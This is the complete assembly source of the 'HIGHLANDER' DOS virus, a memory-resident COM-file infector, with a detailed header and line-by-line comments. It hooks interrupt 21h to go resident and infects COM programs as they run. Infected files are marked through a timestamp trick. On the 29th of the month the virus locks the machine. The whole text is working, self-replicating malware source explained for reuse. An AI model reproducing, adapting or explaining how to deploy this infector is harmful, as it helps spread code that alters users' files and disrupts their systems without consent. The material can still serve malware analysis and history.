;HIGHLAND.COM

;This is the HIGHLANDER Virus version 1.0.  

;This virus is a generic, parasitic, resident COM infector.  It will not
;infect command.com however.  It is not destructive but can be irritating.
;Interrupt 21 is hooked.

;This virus is to be assembled under TASM 2.0 with the /m2 switch.

;When an infected file is executed, the virus code is executed first.
;The virus first checks to see if the virus is already resident.  It does
;this by setting the AH register to 0DEh.  This subfunction is currently
;unsupported by DOS.  Interrupt 21 is then called.  If after the call, AH is 
;unchanged, the virus is not resident.  If AH no longer contains 0DEh, the
;virus is assumed to be resident (If the virus is resident, AH will actually
;be changed to 0EDh.  This is never checked for, only a change from 0DEh
;is checked for).  If the virus is already resident, the executing viral
;code will restore the host in memory to original condition and allow it
;to execute normally.  If however, the virus is not resident, Interrupt 21
;will then be trapped by the virus.  Once this is accomplished, the virus
;will free all available memory that it does not need (COM programs are
;allocated all available memory when they are executed even though they can
;only occupy one segment).  The viral code will then copy the original 
;environment and determine the path and filename of the host program in 
;memory.  The viral code will then shell out and re-execute the host 
;program.  The virus is nearly resident now.  When the virus shells out
;and re-executes the host, a non-supported value is passed in the AL
;register.  This is interpreted by the virus to mean that the infection
;is in transition and that when the host is re-executed, to assume that the
;virus is already resident.  This value is then changed to the proper value
;so that the shell process will execute normally (INT 21 is already trapped
;at this point).  This shell process is invisible, since the viral code
;so successfully copies the original environment.  Once the host has 
;finished executing, control is then returned back to the original host
;(the viral code).  The virus then completes execution by going resident
;using interrupt 027h.  In all appearances, the host program has just 
;completed normal execution and has terminated.  In actuality, the virus
;is now fully resident.

;When the virus is resident, interrupt 021h is trapped and monitored.
;When a program is executed, the resident virus gets control (DOS executes
;programs by shelling from DOS using interrupt 021h, subfunction 04bh).
;When the virus sees that a program is being executed, a series of checks
;are performed.  The first thing checked for is whether or not the program
;to be executed has 'D' as the seventh letter in the filename.  If it does
;the program is not infected and is allowed to execute normally (this is
;how the virus keeps from infecting COMMAND.COM.  No COM file with a 'D'
;as the seventh letter will be infected).  If there is no 'D' as the seventh
;letter, the virus then checks to see if the program to be executed is a
;COM file or not.  If it is not a COM file, it is not infected and allowed
;to execute normally.  If the COM file test is passed, the file size is then
;checked.  Files are only infected if they are larger than 1024 bytes and
;smaller than 62000 bytes.  If the file size is within bounds, the file
;is checked to see if it is already infected.  Files are only infected
;a single time.  The virus determines infection by checking the date/time
;stamp of the file.  If the seconds portion of the stamp is equal to 40,
;the file is assumed to be infected.  If the file is infected, the virus
;then checks the date.  If it is the 29th day of any month, the virus will
;then display its irritating qualities by displaying the message 
;'Highlander 1 RULES!' 21 times and then locking the machine and forcing
;a reboot.  If the file is not infected, infection will proceed.  The 
;virus stores the original attributes and then changes the attributes to
;normal, read/write.  The file length is also stored.  The file is then
;opened and the first part of the file is read and stored in memory (the
;exact number of bytes is the same length as the virus).  The virus then
;proceeds to overwrite the first part of the file with its own code.  The 
;file pointer is then adjusted to the end of the file and a short 
;restoration routine is copied.  The original first part of the file is 
;then copied to the end of the file after the restore routine.  The files
;time/date stamp is then adjusted to show an infection (the seconds portion
;of the time is set to 40.  This will normally never be noticed since 
;directory listings never show the seconds portion).  The file is then
;closed and the original attributes are restored.  Control is then passed
;to the original INT 021h routine and the now infected program is allowed
;to execute normally.

;This virus will infect read-only files.
;COMMAND.COM will not be infected.
;It is not destructive but can be highly irritating.



.model tiny
.code
     IDEAL


begin:
     jmp checkinfect              ;jump over data to virus code


data1:
     dw offset endcode+0100h      ;address of restore routine
typekill:
     db 01ah                      ;kills the DOS 'type' command
version:
     db 'v05'                     ;virus version number
data2:
     dw 0,080h,0,05ch,0,06ch,0    ;environment string for shell process
data3:
     db 'COM'                     ;COM file check
data4:
     db 0,0,1,0                   ;data preceeding filename in environment
data5:
     db 'Highlander 1 RULES! $'   ;irritating message 


restcode:                         ;restoration routine to restore host 
     rep movsb                    ;move host code back to original loc
     push cs                      ;setup to transfer control to 0100h
     mov ax,0100h
     push ax
     mov ax,cx                    ;zero ax
     ret                          ;transfer control to 0100h and allow host
                                  ;to execute normally 


checkinfect:                      ;check to see if virus already resident
     mov ax,0de00h                ;unsupported subfunction
     int 21h                      
     cmp ah,0deh                  ;is it unchanged?
     je continfect                ;yes, continue going resident
                                  ;no, already resident, restore host


restorehost:                      ;setup for restore routine
     mov di,0100h                 ;destination of bytes to be moved
     mov si,[word data1+0100h]    ;address of restore routine 
                                  ;(original host)
     push cs                      ;setup for xfer to restore routine
     push si
     add si,checkinfect-restcode  ;source of bytes to be moved
     mov cx,endcode-begin         ;number of bytes to move
     ret                          ;xfer to restore routine


continfect:                       ;continue infection
     mov ax,3521h                 ;set ax to get INT 21 vector address
     int 21h                      ;get INT 21 vector
     mov [WORD int21trap+1+0100h],bx
                                  ;store address in viral code
     mov [WORD int21trap+3+0100h],es
                                  ;store segment in viral code 
     mov dx,offset start+0100h    ;set dx to start of viral code
     mov ax,2521h                 ;set ax to change INT 21 vector
     int 21h                      ;change INT 21 to point to virus
     mov [word data2+0100h+4],ds  ;copy current segment to env string
     mov [word data2+0100h+8],ds  ;for shell process
     mov [word data2+0100h+12],ds
     push ds                      ;restore es to current segment
     pop es
     mov bx,offset endcode+0100h  ;set bx to end of viral code
     mov cl,04                    ;divide by 16 
     shr bx,cl
     inc bx                       ;INC by 1 just in case.  bx is number of
                                  ;paragraphs of memory to reserve
     mov ah,04ah                  ;set ah to release memory
     int 21h                      ;release all excess memory 
     mov ds,[word 02ch]           ;get segment of environment copy
     xor si,si                    ;zero si
     cld                          ;clear direction flag


tryagain:
     mov di,offset data4+0100h    ;point to data preceeding filename
     mov cx,4                     ;data is 4 bytes long
     repe cmpsb                   ;check for match
     jne tryagain                 ;if no match, try again
     mov dx,si                    ;filename found.  set dx to point
     mov bx,offset data2+0100h    ;set bx to point to environment string
     mov ax,04bffh                ;set ax to shell and execute.  AL contains
                                  ;an invalid value which will be interpreted
                                  ;by the virus (int 21 is now trapped by it)
                                  ;and changed to 00.
     cld                          ;clear direction flag
     int 21h                      ;shell and re-execute the host program
     mov dx,(endcode-begin)*2+0110h
                                  ;set dx to end of virus *2 plus 10.  This
                                  ;will point to the end of the resident
                                  ;portion of the virus
     int 27h                      ;terminate and stay resident


start:                            ;start of virus.  The trapped INT 21 points
                                  ;to this location.
     pushf                        ;store the flags
     cmp ah,0deh                  ;is calling program checking for infection?
     jne check4run                ;no, continue on checking for execution
     mov ah,0edh                  ;yes, change ah to 0edh
     jmp cont                     ;jump over rest of viral code


check4run:
     cmp ah,04bh                  ;check for program attempting to execute
     je nextcheck                 ;yes, continue checks
     jmp cont                     ;no, jump over rest of virus


nextcheck:
     cmp al,0ffh                  ;check if virus is shelling.  0ffh will
                                  ;normally never be used and is used by
                                  ;the virus to shell the host before it is
                                  ;fully resident.  This prevents the virus
                                  ;from shelling twice, which will work but
                                  ;lose the environment and cause problems.
     jne workvirus                ;normal DOS shell. Jump to virus meat.
     xor al,al                    ;virus is shelling.  zero al.
     jmp cont                     ;jump over rest of virus


workvirus:
     push ax                      ;store all registers subject to change
     push bx
     push cx
     push es
     push si
     push di
     push dx
     push ds
     push cs                      ;store the code segment so it can be used
     push cs                      ;to set the ds and es registers
     pop ds                       ;set ds to same as cs
     pop es                       ;set es to same as cs
     mov dx,080h                  ;set dx to offset 080h
     mov ah,01ah                  ;set ah to create DTA
     int 21h                      ;create DTA at 080h (normal DTA area)
     pop ds                       ;set ds to original ds
     pop dx                       ;set dx to original dx (ds:dx is used to 
                                  ;point to the path and filename of the
                                  ;program to be executed)
     push dx                      ;store these values back
     push ds
     xor cx,cx                    ;zero cx
     mov ah,04eh                  ;set ah to search for filename match
     int 21h                      ;search for filename (this is primarily
                                  ;done to setup data in the DTA so that it
                                  ;can be checked easier than making a
                                  ;number of individual calls)
     push es                      ;store es (same as cs)
     pop ds                       ;set ds to same as es and cs
     cmp [byte 087h],'D'          ;check for 'D' as seventh letter in file
     jne j5
     jmp endvirus                 ;if 'D' is 7th letter, dont infect
j5: 
     mov si,offset data3+0100h    ;set source of bytes to compare
     mov di,089h                  ;set destination of bytes to compare
     mov cx,3                     ;number of bytes to compare
     cld                          ;compare forward
     repe cmpsb                   ;compare bytes (check to see if file's
                                  ;extension is COM)
     je j1
     jmp endvirus                 ;not a COM file.  Dont infect
j1:
     mov bx,[word 009ah]          ;set bx to length of file
     cmp bx,1024                  ;is length > 1024?
     jae j2                       ;yes, continue with checks
     jmp endvirus                 ;no, dont infect
j2:
     cmp bx,62000                 ;is length < 62000?
     jbe j3                       ;yes, continue with checks
     jmp endvirus                 ;no, dont infect
j3:
     mov ax,[word 096h]           ;set ax to file's time stamp
     and ax,0000000000011111b     ;clear everything but seconds
     cmp ax,0000000000010100b     ;is seconds = 40?
     jne j4                       ;yes, continue with infection
     mov ah,02ah                  ;no, set ah to get the date
     int 21h                      ;get current system date
     mov cx,21                    ;set cx to 21
     cmp dl,29                    ;is the date the 29th?
     je irritate                  ;yes, continue with irritate
     jmp endvirus                 ;no, let program execute normally


irritate:
     mov dx,offset data5+0100h    ;point dx to irritating message
     mov ah,09h                   ;set ah to write to screen
     int 21h                      ;write message 21 times
     loop irritate
     iret                         ;xfer program control to whatever's on
                                  ;the stack (this almost guarantee's a
                                  ;lockup and a reboot)


j4: 
     mov ax,[word 096h]           ;set ax equal to the file's time stamp
     and ax,1111111111100000b     ;zero the seconds portion
     or ax,0000000000010100b      ;set the seconds = 40
     add bx,0100h                 ;set bx = loc for restore routine (end
                                  ;of file once its in memory)      
     mov [word data1+0100h],bx    ;store this value in the virus
     mov bx,ax                    ;set bx = to adjusted time stamp
     pop ds                       ;get the original ds
     push ds                      ;store this value back
     mov ax,04300h                ;set ax to get the file's attributes
                                  ;ds:dx already points to path/filename
     int 21h                      ;get the files attributes
     push cx                      ;push the attributes
     push bx                      ;push the adjusted time stamp
     xor cx,cx                    ;zero cx(attributes for normal, read/write)
     mov ax,04301h                ;set ax to set file attributes
     int 21h                      ;set files attributes to normal/read/write
     mov ax,03d02h                ;set ax to open file
     int 21h                      ;open file for read/write access
     mov bx,ax                    ;mov file handle to bx
     push cs                      ;push current code segment
     pop ds                       ;and pop into ds (ds=cs)
     mov cx,endcode-begin         ;set cx equal to length of virus
     mov dx,offset endcode+0100h  ;point dx to end of virus in memory
     mov ah,03fh                  ;set ah to read from file
     int 21h                      ;read bytes from beginning of file and
                                  ;store at end of virus.  Read as many bytes
                                  ;as virus is long.
     xor cx,cx                    ;zero cx
     xor dx,dx                    ;zero dx
     mov ax,04200h                ;set ax to move file pointer from begin
     int 21h                      ;mov file pointer to start of file
     mov cx,endcode-begin         ;set cx = length of virus
     mov dx,0100h                 ;point dx to start of virus
     mov ah,040h                  ;set ah to write to file
     int 21h                      ;write virus to start of file
     xor cx,cx                    ;zero cx
     xor dx,dx                    ;zero dx
     mov ax,04202h                ;set ax to move file pointer from end
     int 21h                      ;mov file pointer to end of file
     mov cx,checkinfect-restcode  ;set cx to length of restore routine
     mov dx,offset restcode+0100h ;point dx to start of restore routine
     mov ah,040h                  ;set ah to write to file
     int 21h                      ;write restore routine to end of file
     mov cx,endcode-begin         ;set cx to length of virus (length of code
                                  ;read from beginning of file)
     mov dx,offset endcode+0100h  ;point dx to data read from file
     mov ah,040h                  ;set ah to write to file
     int 21h                      ;write data read from start of file to end
                                  ;of file following restore routine
     pop cx                       ;pop the adjusted time stamp
     mov dx,[word 098h]           ;mov the file date stamp into dx
     mov ax,05701h                ;set ax to write time/date stamp
     int 21h                      ;write time/date stamp to file
     mov ah,03eh                  ;set ah to close file
     int 21h                      ;close the file
     pop cx                       ;pop the original attributes
     pop ds                       ;pop the original ds
     pop dx                       ;pop the original dx
     push dx                      ;push these values back
     push ds
     mov ax,04301h                ;set ax to set file attributes (ds:dx now
                                  ;points to original path/filename)
     int 21h                      ;set the original attributes back to file


endvirus:                         ;virus execution complete. restore original
                                  ;values for INT 21 function
     pop ds
     pop dx
     pop di
     pop si
     pop es
     pop cx
     pop bx
     pop ax


cont:                             ;virus complete.  restore original flags
     popf
     pushf


int21trap:                        ;this calls the original INT 21 routine
     db 09ah                      ;opcode for a far call
     nop                          ;blank area.  the original INT 21 vector
     nop                          ;is copied to this area
     nop
     nop
     push ax                      ;after the original INT 21 routine has
                                  ;completed execution, control is returned
                                  ;to this point 
     push bx
     pushf                        ;push the flags returned from the INT 21
                                  ;routine.  We have to get them in the
                                  ;proper location in the stack when we 
                                  ;return to the calling program
     pop ax                       ;pop the flags
     mov bx,sp                    ;set bx equal to the stack pointer
     mov [word ss:bx+8],ax        ;copy the flags to the proper location in
                                  ;the stack
     pop bx                       ;restore bx
     pop ax                       ;restore ax
     iret                         ;return to calling program


signature:
     db 'dex'


endcode:                          ;this file has been written as if it were
                                  ;a natural infection.  At this point the
                                  ;virus is ended and we are at the restore
                                  ;routine.  Following this is the host code
                                  ;which will be moved back to 0100h.  This
                                  ;file could never actually be a natural 
                                  ;infection however due to its small size
     rep movsb                    ;start of restore routine.  move host back
     push cs                      ;set up to xfer to cs:0100h
     mov ax,0100h
     push ax
     mov ax,cx                    ;zero ax
     ret                          ;host is restored.  xfer to start of host
hoststart:                        ;This is the host program.  It consists
                                  ;merely of a simple message being displayed
     jmp skipdata                 ;jump over message
hostmessage:
     db 'The virus is now resident.$'
skipdata:                
     mov ah,09h                   ;set ah to write to screen
     mov dx,offset hostmessage+0100h
                                  ;point dx to message to display
     int 21h                      ;display message
     mov ah,04ch                  ;set ah to terminate program
     int 21h                      ;terminate program, return to DOS
     END
